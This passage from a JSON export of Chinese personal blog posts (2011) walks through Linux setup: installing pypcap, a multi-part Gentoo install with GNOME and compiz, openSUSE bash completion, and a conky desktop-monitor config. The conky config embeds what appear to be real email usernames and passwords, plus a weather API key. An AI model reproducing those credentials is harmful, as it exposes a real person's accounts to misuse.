dongwm:\n&gt;&gt;&gt; a.close()\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "14"
    }
  },
  {
    "id": 109,
    "title": "解决linux下安装pypcap问题",
    "category": "python",
    "tags": [
      "pypcap",
      "python-pypcap"
    ],
    "url": "/archives/jiejuelinuxxiaanzhuangpypcapwenti/",
    "content": "<p>前言：libpcap的python接口pypcap的安装我想很多编译安装者都很头疼，因为可能出现很多报错，类似于下面：</p>\n\n<p>在包含自 /usr/local/include/python2.6/Python.h：58 的文件中，\n从 pcap.c：3:\n/usr/local/include/python2.6/pyport.h:685:2: 错误：#error \"LONG_BIT definition appears wrong for platform (bad gcc/glibc config?).\"</p>\n\n<p>......</p>\n\n<p>pcap.c:1719: 警告：未使用的变量 ‘p’\npcap.c: In function ‘__pyx_tp_dealloc_4pcap_pcap’:\npcap.c:1724: 警告：未使用的变量 ‘p’\npcap.c: In function ‘__pyx_tp_traverse_4pcap_pcap’:\npcap.c:1739: 警告：未使用的变量 ‘p’\npcap.c:1738: 警告：未使用的变量 ‘e’\npcap.c: In function ‘__pyx_tp_clear_4pcap_pcap’:\npcap.c:1744: 警告：未使用的变量 ‘p’\npcap.c: In function ‘__Pyx_GetStarArgs’:\npcap.c:2253: 警告：建议显式地使用花括号以避免出现有歧义的 ‘else’\npcap.c:2255: 警告：建议显式地使用花括号以避免出现有歧义的 ‘else’\nerror: command 'gcc' failed with exit status 1</p>\n\n<p><strong> 首先确定环境：</strong></p>\n\n<p><strong>1 安装python-devel（需要Python.h）</strong></p>\n\n<p><address><strong>2 安装libpcap，libpcap-devel （需要pcap.h）</strong></address><strong>3 安装pypcap：</strong>\n<p align=\"LEFT\"><span style=\"font-family: Liberation Serif,serif;\"><span style=\"font-size: x-small;\">tar zxvf pypcap-1.1.tar.gz </span></span></p>\n<p align=\"LEFT\"><span style=\"font-family: Liberation Serif,serif;\"><span style=\"font-size: x-small;\">cd pypcap-1.1</span></span></p>\n<p align=\"LEFT\"><span style=\"font-family: Liberation Serif,serif;\"><span style=\"font-size: x-small;\">CFLAGS=-m32 python setup.py config </span></span></p>\n<p align=\"LEFT\"><span style=\"font-family: Liberation Serif,serif;\"><span style=\"font-size: x-small;\">CFLAGS=-m32 python setup.py build </span></span></p>\n<p align=\"LEFT\"><span style=\"font-family: Liberation Serif,serif;\"><span style=\"font-size: x-small;\">CFLAGS=-m32 python setup.py install </span></span></p>\n<p align=\"LEFT\"></p>\n&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "20"
    }
  },
  {
    "id": 110,
    "title": "gentoo笔记（一）安装基本gentoo系统随笔",
    "category": "gentoo",
    "tags": [
      "安装gentoo"
    ],
    "url": "/archives/gentooanzhuangbiji/",
    "content": "<p>前言：gentoo是定制安装的操作系统，非专业人士比较害怕，装过ubuntu，fedora什么的同学也应该知道这个东西比较困难吧？我自称熟悉linux，但是我的个人笔记本光驱坏了，公司机器貌似硬件“太新”装不了linux(我的opnesuse是硬盘安装)一直没有去弄，最近忽然想玩玩，首先我申明没有使用freebsd的经验。基本属于摸索安装吧，以下是我的安装笔记（和官网的有些不同，其他网上资料都是拷贝的一个安装笔记，顺便说一下：我很鄙视转载的这些人），这个安装笔记一值是我安装过程的记录，总结和一些对gentoo的理解请关注系列文章</p>\n\n<p><pre class=\"sh_bash\">\n1 安装选择</p>\n\n<p>有2种方式：1 最小化安装iso，然后自己定制要安装什么，这是我选择的，玩嘛 就要玩这样的</p>\n\n<p>2 livecd，我虽然没有具体体验，但是我觉得想学东西还是不要用这个了</p>\n\n<p>2 引导</p>\n\n<p>出现\"boot:\"时，有个刺耳的“滴”</p>\n\n<p>输入  gentoo dopcmcia  #非默认内核参数，支持framebuffer缓冲,启动pcmcia设备。 默认的直接回车就行 ,参数\n3 配置网络(自动模式)</p>\n\n<p>net-setup eth0  根据图形界面提示，我选择下面的，选择下面的，再输入IP，掩码，网关，DNS 。最后一个可以直接回车\n然后测试是否联网 ping 一下\n4 分区\n使用fdisk /dev/sda\n我的分区很多删除了2个分区，然后新建2个分区，一个是linux根分区，一个是交换分区，交换分区记得改ID(使用‘t’选项)\n根分区是/dev/sda9\nswap /dev/sda8\n5 创建文件系统</p>\n\n<p>mke2fs -j /dev/sda9  #－j 表示创建ext3 </p>\n\n<p>6 激活swap</p>\n\n<p>mkswap /dev/sda8\nswapon /dev/sda8\n7 挂载</p>\n\n<p>mount /dev/sda9 /mnt/gentoo\n8 下载解压Stage Tarball和Portage</p>\n\n<p>通过 links http://www.gentoo.org/main/en/mirrors.xml  选择镜像地点，我选择的是电子科技大学的那个 （http://mirrors.stuhome.net/gentoo/） 以后我也都是选择的这个网站的相关 速度比较快 163，sohu什么的印象一直不好</p>\n\n<p>#cd /mnt/gentoo &amp;&amp; tar xvjpf stage3-*.tar.bz2 tar xvjf portage-latest.tar.bz2 -C /mnt/gentoo/usr  #stage需要保持以前的权限 portage包在镜像的snapshots目录下\n9 配置编译选项修改\n默认已经是:CFLAGS=\"-O2 -march=i686 -pipe\"\nCXXFLAGS=\"${CFLAGS}\"\n添加 MAKEOPTS=\"-j3\" #cpu+1\n10 选择境像站点 #这2个很重要 要是不选择的话 他可能默认去那些以来软件的官方网站，比如gnome.org，sf.net 你的网速不好的话 清别这么残忍。而且有些软件包官网没有 只有gentoo镜像有</p>\n\n<p>mirrorselect -i -o &gt;&gt; /mnt/gentoo/etc/make.conf</p>\n\n<p>mirrorselect -i -r -o &gt;&gt; /mnt/gentoo/etc/make.conf   #我的都选择了电子科技大学的</p>\n\n<p>11 拷贝dns记录</p>\n\n<p>cp -L /etc/resolv.conf /mnt/gentoo/etc/\n12 挂载/proc和/dev文件系统</p>\n\n<p>mount -t proc none /mnt/gentoo/proc  #过程中我发现有时候执行命令但是proc没挂上 重置执行就行，这个在emerage时候会提示没有挂载\nmount -o bind /dev /mnt/gentoo/dev\n13 chroot到新系统</p>\n\n<p>chroot /mnt/gentoo /bin/bash</p>\n\n<p>env-update\n&gt;&gt; Regenerating /etc/ld.so.cache...\nsource /etc/profile\n14 配置Portage</p>\n\n<p>emerge --sync  #同步portage树</p>\n\n<p>eselect profile list #Profile列表</p>\n\n<p>eselect profile  set 4 #我选择的是桌面－gnome\n15 配置USE变量</p>\n\n<p> nano -w /etc/make.conf\n添加 USE=\"gtk sqlite gnome qt3 qt4 kde dvd alsa cdr libkms python\"  #这里的和官网的不一样，这个文件就是emerge使用的配置文件，也是我安装过程添加和总结的，\n很重要 我这里的是安装gnome和kde2个桌面（都是学官网的错，官网的是不安装gnome安装kde），这样的话依赖的软件都会在编译时添加对这些的支持</p>\n\n<p> 16 修改时区</p>\n\n<p>cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime </p>\n\n<p>17 安装源码</p>\n\n<p>emerge gentoo-sources\n18 使用genkernel自动配置内核 #本来最开始使用的是手动配置，但是在安装grub之后，我自己修改的启动项一直报错不能正常启动\n我感觉是因为我的内核名字的原因：我的内核是linux－3.0.6－gentoo，在编辑grub.conf时用了很多表达方法，但是好像没有实现grub的匹配</p>\n\n<p>emerge genkernel\n注：这里需要一个镜像里面的文件：在chroot前：cp -rp /mnt/livecd/lib/firmware /mnt/gentoo/lib  这个目录使用‘df -h’能看见被挂载\nzcat /proc/config.gz &gt; /usr/share/genkernel/arch/x86/kernel-config</p>\n\n<p>genkernel all\n18 修改/etc/fstab #Gentoo系统默认的/etc/fstab文件不是有效的fstab文件。创建自己的/etc/fstab\n我的文件很简单：\n/dev/sda8 none swap sw 0 0\n/dev/sda9 / ext3 noatime 0 1   #noatime 表示不记录该分区中文件的访问时间，提高系统速度\n19 修改网络</p>\n\n<p>nano -w /etc/conf.d/net</p>\n\n<p>config_eth0=( \"192.168.2.23/24\" )\nroutes_eth0=( \"default via 192.168.2.254\" )</p>\n\n<p>cd /etc/init.d\nln -s net.lo net.eth0\nrc-update add net.eth0 default #为了让机器启动时候启动网卡,这样船舰初始脚本 能使用/etc/init.d/net.eth0 restart 重启网卡</p>\n\n<p>20 非常重要的一步：设置root密码，要不然你重启启动要求登录你是登录不了的，而且gentoo的单用户模式是不可用的，或者说我的这种genkernel方式的安装是不能进入单用户模式的\n21 安装系统常用软件 syslog和cron，locate（文家你使用索引，不要用find / 这样的方式）并且开机自动默认启动\nemerge syslog-ng vixie-cron mlocate &amp;&amp; rc-update add vixie-cron default &amp;&amp; rc-update add syslog-ng default #官网说是slocalte，但是我的系统是mlocate\n22 安装配置启动引导grub</p>\n\n<p>emerge grub</p>\n\n<p>nano -w /boot/grub/grub.conf</p>\n\n<p>default 1  #默认是超时后进入windows 7\ntimeout 10  #超时10s\nsplashimage=(hd0,8)/boot/grub/splash.xpm.gz #开机启动背景界面  不需要改动</p>\n\n<p>title Gentoo 3.0.6\nroot (hd0,8) #sda9 的9 －1\nkernel /boot/kernel-genkernel-x86-3.0.6-gentoo root=/dev/ram0 init=/linuxrc ramdisk=8192 real_root=/dev/sda9 #默认建好了\ninitrd /boot/initramfs-genkernel-x86-3.0.6-gentoo</p>\n\n<p># 我的是windows+gentoo\ntitle Windows 7\nrootnoverify (hd0,3)\nmakeactive\nchainloader +1</p>\n\n<p>grep -v rootfs /proc/mounts &gt; /etc/mtab #创建mtab文件，要不然不能安装 没有创建一个独立的boot分区，排除rootfs行</p>\n\n<p>grub-install --no-floppy /dev/sda #安装grub\n23 退出重启</p>\n\n<p># exit\ncd\numount /mnt/gentoo/boot /mnt/gentoo/dev /mnt/gentoo/proc /mnt/gentoo\nreboot\n</pre>\n</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "23"
    }
  },
  {
    "id": 111,
    "title": "opnesuse sudo 支持tab自动补齐",
    "category": "opensuse",
    "tags": [
      "bash_completion"
    ],
    "url": "/archives/opnesusesudozhichitabzidongbuqi/",
    "content": "<p>前言：just 一个小技巧，一直依赖使用linux终端都习惯tab补全命令或者路径，但是在opensuse 使用sudo时候却不是这样，比如我想重启一个/etc/init.d目录下的服务：</p>\n\n<p>sudo  /etc&lt;TAB&gt; 直接 就把空格大出来 相当于 cat /etc 加入想要查看下以及目录，就得退格，然后输入“/”，再使用TAB</p>\n\n<p>解决方案：</p>\n\n<p>安装配置bash-completion</p>\n\n<p>dongwm@linux-b8lh:~&gt; sudo zypper in bash-completion</p>\n\n<p>dongwm@linux-b8lh:~&gt; . /etc/bash_completion\n然后就OK了，方便了很多</p>\n\n<p>每次登录支持：</p>\n\n<p><code>在/etc/bash.bashrc文件加入</code>\n<code>\nif [ -f /etc/bash_completion ]; then\n. /etc/bash_completion\nfi</code></p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "23"
    }
  },
  {
    "id": 112,
    "title": "gentoo笔记（二）安装gnome桌面及安装出现问题解决＋安装总结",
    "category": "gentoo",
    "tags": [
      "gentoo gnome"
    ],
    "url": "/archives/gentoobijieranzhuanggnomezhuomianjianzhuangchuxianwentijiejueanzhuangzongjie/",
    "content": "<p>前言：不作为服务器的话，肯定是需要安装图形桌面的，我一直是gnome的忠实支持者，所以这里还是安装gnome</p>\n\n<p><strong>1 安装前准备</strong></p>\n\n<p>首先去配置make.conf</p>\n\n<p>1 里面USE包含：USE=\"gtk gnome\"</p>\n\n<p>2 添加特性： FEATURES＝“parallel-fetch” #安装时候同时下载和安装编译 提高速度 但是我没有添加时候好像也是下载和安装同时进行，只要你下载好一个文件，就会去安装，这个过程中他会继续下载</p>\n\n<p>总结:这里面的选项代表安装软件对其的支持和不支持，前面加\"-\"表示不支持</p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\">#emerge --oneshot libtool #<span style=\"font-family: 楷体_GB2312; font-size: small;\">重编译libtool以避免一些潜在的问题</span>\n</span>\n<div><wbr><span style=\"font-family: 楷体_GB2312; font-size: small;\"># dispatch-conf  更新配置文件<wbr>\n</wbr><wbr>\n# python-updater</wbr><wbr>  升级了python的主要软件包，执行python-updater脚本</wbr></span></wbr></div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\">3 安装驱动（我的是ati，nvidia的类似）</span></div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\"><span style=\"font-family: 楷体_GB2312; font-size: small;\"># emerge ati-drivers\n安装完成后，运行modprobe nvidia把内核模块载入内存。如果是在升级的情况下，应该把先前的模块移出内存。\n代码 : 载入内核模块\n# lsmod | grep fglrx #如果有就卸载 rmmod fglrx<wbr></wbr><wbr></wbr></span></span></div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\"><span style=\"font-family: 楷体_GB2312; font-size: small;\"># modprobe fglrx<wbr>\n# update-modules #运行update-modules</wbr><wbr>\n# eselect opengl set nvidia #运行eselect，让X服务使用ati的GLX库</wbr></span></span></div>\n<div>4 安装alsa声卡驱动</div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\">emerge alsa-utils<wbr></wbr></span></div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\"># alsaconf  #ALSA 启动脚本\n代码 : 将ALSA加入到自启动\n# rc-update add alsasound boot</span></div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\"># /etc/init.d/alsasound start<wbr></wbr></span> 启动服务</div>\n<div>#<span style=\"font-family: 楷体_GB2312; font-size: small;\">alsamixer<wbr></wbr></span> #配置项</div>\n<div><span style=\"font-family: 楷体_GB2312; font-size: small;\">* 使用左右箭头键（&lt;- &amp; -&gt;）来转换声道。\n* 要静音／禁止静音，移动到该声道，比如说Master，按键盘上的m键。\n* 用上下箭头键来增加／减小音量。\n<wbr></wbr></span></div>\n<strong>2 安装gnome</strong></p>\n\n<p>emerge gnome xscreensaver  （有一个轻量极的 叫做 gnome-light）</p>\n\n<p>这个是很费时间的一件事 只能说很久很久。。。依赖包几百个  而且会出现一些问题，比如：</p>\n\n<p>1 提示某下载的文件和他预设的文件的大小不同 验证没有通过 这个很centos的yum一样很头疼 ，他和问题2是一样的解决</p>\n\n<p>2 提示某下载的文件不存在或者无法下载，然后切换到这个软件包的portage目录下发现有几个软件包，如果某其他软件包可以下载安装 你可以修改这个不能下载的包的ebuild文件 ，把里面的变量：“SRC__URI”,后面的是包的地址，但是是用变量“${P}”(或者其他表示)，注释掉这一行，然后 ctrl+ k 然后ctrl+u 复制一行（nano）修改成那个具体能安装的数值。但是能不这样就不要遮阳修改 也许过一段时间就能正常下载了。改成其他的版本也尽量找相近最近的</p>\n\n<p>3 提示安装gnome依赖XXX 这样的话可能需要你专门去安装这个软件 他会提示你 是什么 比如XXX－XXX／YYY 表示默认路径的是（默认在）/usr/portage/XXX-XXX/YYY，切换进去安装看看提示什么，根据提示去一步一步解决，然后也就有了上一篇我在USE变量里面的其他选项，并且USE参数的列表在/usr/portage/profiles/use.desc或者官网的http://www.gentoo.org/dyn/use-index.xml 我还没有研究其他参数都有什么区别和作用</p>\n\n<p>4 为了下载请选择网速好的镜像</p>\n\n<p>5 当安装的包有几个相同名字的时候 就需要指定具体地址了，比如下面的fam  我按装app-admin/fam  那么就是 emerge app-admin/fam</p>\n\n<p><strong>3 配置gnome<span style=\"font-family: 楷体_GB2312; font-size: small;\">\n</span></strong><span style=\"font-family: 楷体_GB2312; font-size: small;\"># env-update &amp;&amp; source /etc/profile  #更新环境变量</span></p>\n\n<p>启动相应项（gnome是famd（下载app-admin/fam）+dbus 据说 gnome-light是hald+gnome）</p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\"># /etc/init.d/famd start   <wbr></wbr><wbr></wbr></span></p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\"># rc-update add famd default</span></p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\"><wbr></wbr><wbr># /etc/init.d/dbus start</wbr></span></p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\"><wbr></wbr><wbr># rc-update add dbus default</wbr></span></p>\n\n<p>让你的用户<span style=\"font-family: 楷体_GB2312; font-size: small;\">设定GNOME为默认桌面环境</span></p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\">$ echo \"exec gnome-session\" &gt; ~/.xinitrc<wbr></wbr></span></p>\n\n<p><span style=\"font-family: 楷体_GB2312; font-size: small;\">$ startx<wbr></wbr></span>  启动gnome</p>\n\n<p>将gnome默认启动\n# rc-update add xdm default\n编辑/etc/rc.conf 添加\nDISPLAYMANAGER=\"gdm\"\nXSESSION=\"Gnome\"</p>\n\n<p></p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "24"
    }
  },
  {
    "id": 113,
    "title": "gentoo笔记（三）安装3D特效compiz",
    "category": "gentoo",
    "tags": [
      "gentoo 3D",
      "gentoo compiz"
    ],
    "url": "/archives/gentoobijisananzhuang3dtexiaocompiz/",
    "content": "<p>前言：玩linux桌面的都会项研究下compiz 我作为一个使用compiz很多年有很深感情的人那是必然要试一试的</p>\n\n<p><strong>1 安装前准备</strong></p>\n\n<p>目前Compiz和大多数的依赖被认为是不稳定的，因此在Portage默认是被掩盖的。 需要添加以下几行到/etc/portage目录下的文件里面，这个解决办法在gentoo安装手册写来着</p>\n\n<p>/etc/portage/package.keywords  没有这个文件创建</p>\n\n<p>dev-libs/protobuf\ndev-util/intltool\ndev-python/compizconfig-python\nx11-apps/ccsm\nx11-libs/libcompizconfig\nx11-libs/compizconfig-backend-gconf\nx11-libs/compizconfig-backend-kconfig4\nx11-libs/compiz-bcop\nx11-plugins/compiz-plugins-main\nx11-plugins/compiz-plugins-extra\nx11-plugins/compiz-plugins-unsupported\nx11-themes/emerald-themes\nx11-wm/compiz\nx11-wm/compiz-fusion\nx11-wm/emerald\napp-i18n/fcitx\nx11-apps/fusion-icon\n/etc/portage/package.use</p>\n\n<p>media-libs/mesa xcb\nx11-libs/libX11 xcb\nx11-libs/cairo xcb svg\nx11-wm/compiz-fusion emerald</p>\n\n<p>我也初始化了一下ati：</p>\n\n<p>aticonfig --initial --input=/etc/X11/xorg.conf</p>\n\n<p><strong>2 安装compiz</strong></p>\n\n<p>emerge compiz compiz-fusion fusion-icon</p>\n\n<p><strong>3 启动compiz</strong></p>\n\n<p>执行 compiz-manager 默认ccsm什么特效都没有选择不要害怕。 先在emerald里面选择一个主题，然后打开compizconfig设置管理器（都在 系统-首选项里面）一定选择：特效里面的窗口装饰 和 窗口管理的移动窗口 呵呵</p>\n\n<p><strong>4 设置开机自启动</strong></p>\n\n<p>其实就是在 系统-首选项的 启动应用程序里面加2项  其他的都怎么描述无所谓  但是命令那一栏  一个是 /usr/bin/compiz-manager 一个是 emerald --replace</p>\n\n<p>5玩其他compiz特向 请参看\n<h2><a href=\"http://www.dongwm.com/archives/compiz-%e5%a4%96%e6%8c%82%e6%8f%92%e4%bb%b6%e6%ac%a3%e8%b5%8f%e5%92%8c%e5%ae%89%e8%a3%85/\">compiz 外挂插件欣赏和安装</a></h2></p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "24"
    }
  },
  {
    "id": 114,
    "title": "gentoo笔记（四）安装常用软件",
    "category": "gentoo",
    "tags": [
      "conky",
      "gentoo 常用软件",
      "last.fm"
    ],
    "url": "/archives/gentoobijisianzhuangchangyongruanjian/",
    "content": "<p>前言：使用linux需要一些工具，比如看视频，分析系统性能，ftp文件等功能，以下是我推荐的</p>\n\n<p><strong>1 ftp上传下载工具</strong></p>\n\n<p>emerge filezilla</p>\n\n<p><strong>2 flash看视频以及一些网站的特效</strong></p>\n\n<p>emerge adobe-flash</p>\n\n<p><strong>3 系统性能工具</strong></p>\n\n<p>emerge htop dstat</p>\n\n<p><strong>4 浏览器</strong></p>\n\n<p>emerge firefox oprea google-chrome  安装火狐相当慢  80M的源码包 我很无语</p>\n\n<p>注：其中的谷歌浏览器需要修改一下make.conf文件 添加授权 ： ACCEPT_LICENSE=\"google-chrome\"</p>\n\n<p><strong>5 邮件客户端</strong></p>\n\n<p>emerge thunderbird  编译也是 相当慢</p>\n\n<p>注：一般kde下有kmail</p>\n\n<p><strong>6编辑器</strong></p>\n\n<p>emerge  vim</p>\n\n<p><strong>7 输入法（我这里是小企鹅输入法，也可以用ibus 但不能用scim： 直接和我内核冲突 ）</strong></p>\n\n<p>字体的存放目录\n/usr/share/fonts</p>\n\n<p>fontconfig配置文件\n/etc/fonts/fonts.conf<!--more-->\n~/.fonts.conf</p>\n\n<p>可能要用到的字体工具\nemerge mkfontdir mkfontscale</p>\n\n<p>下载好看的英文字体:\nemerge ttf-bitstream-vera corefonts</p>\n\n<p>下载好看的中文字体:\nemerge media-fonts/wqy-bitmapfont  和wqy-zenhei</p>\n\n<p>在xorg.conf中Section \"Files\"中加入新增的字体目录</p>\n\n<p>使用fc-cache更新系统字体</p>\n\n<p>使用xlsfonts检查字体是否已经存在</p>\n\n<p>安装小企鹅输入法\nemerge fcitx</p>\n\n<p>touch /etc/X11/xinit/xinitrc.d/100-xinputrc\nchmod +x /etc/X11/xinit/xinitrc.d/100-xinputrc\ncat /etc/X11/xinit/xinitrc.d/100-xinputrc\n# !/bin/bash\nXIM=\"fcitx\"\nXIM_PROGRAM=\"fcitx\"\nXIM_ARGS=\"-d\"\nXMODIFIERS=\"@im=fcitx\"\nGTK_IM_MODULE=\"fcitx\"\nexport XIM XIM_PROGRAM XMODIFIERS GTK_IM_MODULE\n$XIM_PROGRAM $XIM_ARGS &amp;\nLC_CTYPE=\"zh_CN\"\n在/etc/profile添加几行\nexport XMODIFIERS=\"@im=fcitx\"\nexport XIM=fcitx\nexport XIM_PROGRAM=fcitx\n注使用五笔的话\ncp /usr/share/fcitx/data/wbx.mb ~/.fcitx</p>\n\n<p>cp /usr/share/fcitx/data/erbi.mb ~/.fcitx</p>\n\n<p>cp /usr/share/fcitx/data/tables.conf ~/.fcitx</p>\n\n<p>8 办公软件</p>\n\n<p>emerge libreoffice   这个的编译速度那是相当的慢</p>\n\n<p>9 编程工具</p>\n\n<p>emerge sshfs-fuse bluefish  # linux下的程序员开发工具bluefish +sshfs远程挂载文件系统</p>\n\n<p>10 截图工具ksnapshot</p>\n\n<p>需要在USE里面添加 “kde” emerge ksnapshot</p>\n\n<p>11 听歌软件last.fm</p>\n\n<p>sudo emerge media-sound/lastfmplayer</p>\n",
    "date": {
      "year": "2011",
      "month": "December",
      "day": "25"
    }
  },
  {
    "id": 115,
    "title": "gentoo笔记（五）安装配置conky",
    "category": "gentoo",
    "tags": [
      "conky",
      "conkyforecast"
    ],
    "url": "/archives/gentoo%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEconky/",
    "content": "<p>前言：这是一个很cool的桌面监控显示软件并可以自定义实现你想要监控的所有</p>\n\n<p>首先上图：</p>\n\n<p><img class=\"alignnone\" title=\"conky\" src=\"http://farm8.staticflickr.com/7003/6592961307_c888ee70c4_z.jpg\" alt=\"\" width=\"163\" height=\"640\" /></p>\n\n<p><img class=\"alignnone\" title=\"conky2\" src=\"http://farm8.staticflickr.com/7020/6598839395_4a9dab05b9_z.jpg\" alt=\"\" width=\"640\" height=\"400\" /></p>\n\n<p><strong>1 安装相应工具</strong>\necho app-admin/conky truetype audacious -ipv6 &gt;&gt; /etc/portage/package.use\necho app-admin/conkyforecast  &gt;&gt; /etc/portage/package.keywords\nsudo  emerge app-admin/conkyapp-admin/conkyforecast  #conky是主程序，conkyforecast是\nconky天气预报的脚本 其实也有一个叫做 conky-colors 的软件。\n里面集成了很多功能 包括天气预报，检查邮件 视频，照片预览等功能。作者是在ubuntu下开发的\n<strong>2 支持中文字体显示</strong>\n首先需要下载一个中文字体 我这里是simhei字体，然后拷贝simhei.ttf到/usr/share/fonts/TTF/conky/\n在需要显示中文的text部分需要utf-8编码 这个地方使用这个字体就可以显示了\n<strong>3 配置文件</strong>\n每一行可以分为样式属性、文字和元素。其中样式属性和元素都以“$”开头，并包含在“{}”里面，\n“${}”应该放在应用目标的前面。\n一些变量的解释：\n${color #XXXXXX} 设计显示的颜色 （在/etc/X11/rgb.txt中找到全部颜色的列表）\n${font Monospace:style=Bold:size=10} 字体属性的定义格式\n${alignr}表示以该参数定义的元素向右对齐，${alignl}表示左对齐，${alignc}表示居中对齐\n<!--more-->\n\n我的个人配置文件：\n<pre class=\"sh_php\">\nbackground yes  #嵌入桌面\nuse_spacer right\nuse_xft yes #使用xft字体\nfont Comic Sans MS:size=9\nxftfont Comic Sans MS:size=9  #在下面的样式定义段可以特别定义使用别的字体，如不特别指定，则使用默认字体\noverride_utf8_locale yes\nupdate_interval 1.0\nown_window yes\nown_window_type normal\nown_window_transparent yes\nown_window_hints undecorated,below,sticky,skip_taskbar,skip_pager\ndouble_buffer yes\nminimum_size 200 5\nmaximum_width 205\ndraw_shades no\ndraw_outline no\ndraw_borders no\ndraw_graph_borders no\ndefault_color ffffff   #默认背景颜色  这里是黑色\ndefault_shade_color 000000\ndefault_outline_color 000000\nalignment top_right\ngap_x 5\ngap_y 5\ncpu_avg_samples 2\nuppercase no # set to yes if you want all text to be in uppercase\noverride_utf8_locale yes\ntext_buffer_size 2048</p>\n\n<p>TEXT\n${color #ffd700}${hr 1}$color\n${color #98c2c7}HostName:${color #db7093} $alignr$nodename\n${color #98c2c7}Kernel: ${color #db7093}$alignr$kernel\n${color #98c2c7}UpTime: ${color #db7093}$alignr$uptime\n${color #ffd700}${hr 1}$color\n${font Comic Sans MS:style=Bold:pixelsize=30}${alignc}${time %H:%M:%S}\n${font Comic Sans MS:pixelsize=18}${alignc}${time %G/%m/%d}${font Comic Sans MS:pixelsize=12}\n${execi 3600 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=CN}\n${font Weather:size=44}${color gold}${execi 3600 conkyForecast --location=CHXX0008 --datatype=WF}${font}${color}${voffset -20}${offset 18}${execi 3600 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=CC}${offset 10}${execi 3600 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=HT}${offset 10}${execi 3600 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=WS} ${font Arrows:size=10}${execi 3600 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=BF}$font\n${offset 10}Sol: ${color}${execi 3600 conkyForecast --location=CHXX0008 --datatype=SR}-${execi 60 python ~/conkyrc/conkyForecast.py --location=CHXX0008 --datatype=SS}\n${font Weather:size=26}${execi 3600 conkyForecast --location=CHXX0008 --datatype=WF --startday=1 --endday=4 --spaces=1}${font}\n${execi 3600 conkyForecast --location=CHXX0008 --datatype=HT --startday=1 --endday=4 --spaces=11}\n${color yellow}${hr 1}$color\n${color yellow} ${alignc}GYYX MAIL\n${font simhei:style=Bold:size=9}${color1}${texeci 180 python ~/conky/conkyCheckMail.py mail.gyyx.cn dongweiming 5782086} ${color yellow}${font}\n${color yellow} ${alignc}GMAIL\n${font simhei:style=Bold:size=9}${color1}${texeci 180 python ~/conky/conkyCheckMail_imap.py imap.gmail.com ciici123@gmail.com dwm5782086} ${color yellow}${font}\n${color #ffd700}${hr 1}$color\n${color red}CPU Used: ${color #db7093} $alignr$cpu%\n${color #78af78}$cpubar\n${color red}Ram:${color #4169e1}$alignr ${color}$mem ${color #98c2c7}${color}/$memmax${color #4169e1}${color #db7093}($memperc%)\n${color #78af78}${membar}\n${color red}Processes:$alignr${color }$processes ($running_processes running)\n${color red}Highest CPU:$alignr PID CPU%\n${color #ddaa00} ${top name 1}$alignr ${top pid 1}${top cpu 1}\n${color lightgrey} ${top name 2}$alignr ${top pid 2}${top cpu 2}\n${color lightgrey} ${top name 3}$alignr ${top pid 3}${top cpu 3}\n${color red}Highest Ram:$alignr PID MEM%\n${color #ddaa00}${top_mem name 1}$alignr${top_mem pid 1}${top_mem mem 1}\n${color}${top_mem name 2}$alignr${top_mem pid 2}${top_mem mem 2}\n${color}${top_mem name 3}$alignr${top_mem pid 3}${top_mem mem 3}\n${color #ffd700}${hr 1}$color\n${color EE9944}${fs_bar 4 /}${color}\n${execpi 30 python ~/conky/conkyHD1.py }\n${color #ffd700}${hr 1}$color\n${color red}${font simhei:size=12}${alignc}网络$color\n${if_up eth1}\n${voffset -13}${color0}${font Comic Sans MS:size=8}${font}${color}${goto 32}${voffset -6} Up: ${font Comic Sans MS:size=8}${color1}${upspeed eth1}${color}${font Comic Sans MS:size=8} ${alignr}${color2}${upspeedgraph eth1 8,60 CE5C00 E07A1F}${color}\n${goto 32}Total: ${font Comic Sans MS:size=8}${color2}${totalup eth1}${color}${font}\n${voffset -2}${color0}${font Comic Sans MS:size=8}${font}${color}${goto 32}${voffset -6} Down: ${font Comic Sans MS:size=8}${color1}${downspeed eth1}${color}${font Comic Sans MS:size=8} ${alignr}${color2}${downspeedgraph eth1 8,60 CE5C00 E07A1F}${color}\n${goto 32}Total: ${font Comic Sans MS:size=8}${color2}${totaldown eth1}${color}${font}\n${voffset -2}${color0}${font Comic Sans MS:size=8}${font}${color}${goto 32}${voffset -4}Local IP: ${alignr}${color2}${addr eth1}${color}\n${goto 32}Public IP: ${alignr}${color2}${execi 10800 ~/conky/onkyIp.sh}${color}\n</pre>\n<strong>2 家目录下的配置文件.conkyForecast.config</strong><pre class=\"sh_python\">\n#=============================================#\n# EXPERT SETTINGS, NOT REQUIRED TO BE ALTERED #\n#=============================================#\nBASE_XOAP_URL = http://xoap.weather.com/weather/local/&lt;LOCATION&gt;?cc=*&amp;dayf=5&amp;link=xoap&amp;prod=xoap&amp;par=1003666583&amp;key=4128909340a9b2fc&amp;unit=m\n#BASE_XOAP_URL = 